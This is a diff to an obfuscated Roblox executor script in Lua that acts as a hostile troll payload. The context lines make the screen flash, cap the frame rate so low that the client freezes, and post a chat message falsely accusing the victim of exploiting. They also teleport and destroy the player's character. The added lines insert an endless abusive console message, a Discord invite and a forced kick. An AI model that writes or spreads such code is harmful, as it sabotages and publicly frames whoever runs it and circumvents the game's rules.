@@ -8,16 +8,32 @@ HFD7S8F6DF997FDT876GHI98YF7G.Parent = DIFEXE7384F4763FE8WUFI
 HFD7S8F6DF997FDT876GHI98YF7G.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 HFD7S8F6DF997FDT876GHI98YF7G.Position = UDim2.new(-0.164109409, 0, 0.651234567, 0)
 HFD7S8F6DF997FDT876GHI98YF7G.Size = UDim2.new(4545757, 1416, 64646544, 835)
+DIFmode = false
 local function DMIV_fake_script()
 	local script = Instance.new('LocalScript', HFD7S8F6DF997FDT876GHI98YF7G)
 	while wait() do
+	if DIFmode == true then
 		script.Parent.BackgroundTransparency = 1
 		HFD7S8F6DF997FDT876GHI98YF7G.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 		wait()
 		script.Parent.BackgroundTransparency = 0
+		end
 	end
 end
 coroutine.wrap(DMIV_fake_script)()
+rconsolename(" ")
+consoleprint("Credits: RegularSVilisz#7789")
+wait(math.random(0.09, 3))
+rconsoleprint(" https://discord.gg/QFvfZE7Wav")
+wait(math.random(2.09, 6))
+rconsoleclear()
+wait(0.05)
+while wait() do
+	rconsoleprint("Get Fucked Noob LMAO")
+	wait()
+	rconsoleprint("               ")
+end
+DIFmode = true
 Instance.new("ColorCorrectionEffect", game:GetService("Lighting")).Saturation = 99999999999999999999999
 setfpscap(0.011)
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(""..game.Players.LocalPlayer.Name.." Are Using Exploits, Please Report Him/Her","All")
@@ -29,3 +45,5 @@ game.Players.LocalPlayer.Character.Humanoid.Health = 1
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(6679853442476879, 563856476, 463486432)
 end
 game.Players.LocalPlayer:Destroy()
+wait(math.random(11,22))
+game.Players.LocalPlayer:Kick("DIF On Top.")
